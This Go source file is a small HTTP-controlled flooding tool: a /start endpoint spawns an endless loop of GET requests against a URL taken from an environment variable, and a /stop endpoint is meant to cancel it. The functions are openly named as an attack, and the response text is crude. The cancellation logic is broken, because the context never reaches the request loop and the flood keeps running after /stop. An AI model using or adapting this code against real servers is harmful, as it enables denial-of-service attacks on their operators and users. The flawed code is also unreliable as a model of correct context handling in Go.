package main

import (
	"context"
	"fmt"
	"os"

	// handle http requests
	"net/http"
)
var (
	ctx context.Context
	cancel context.CancelFunc
)
func SendRequest(url string) error {
	for {
		_, err := http.Get(url)
		if err != nil {
			return err
		}
	}
}
func AttackServer(ctx context.Context, url string) error {
	c := make(chan error, 1)
	go func() {
		c <- SendRequest(url)
	} ()
	if(ctx.Done() != nil){
		return ctx.Err()
	}
	return nil
}

func InitiateAttack(w http.ResponseWriter, r *http.Request) {
	ctx, cancel = context.WithCancel(context.Background())
	r.ParseForm()
	go AttackServer(ctx, os.Getenv("URL"))
	fmt.Fprintf(w, "attack mothafucka")
}

func CancelAttack(w http.ResponseWriter, r *http.Request) {
	cancel()
	fmt.Fprintf(w, "canceled")
}
func main () {
	http.HandleFunc("/start", InitiateAttack)
	http.HandleFunc("/stop", CancelAttack)
	fmt.Println("listening on :6443")
	http.ListenAndServe(":6443", nil)

}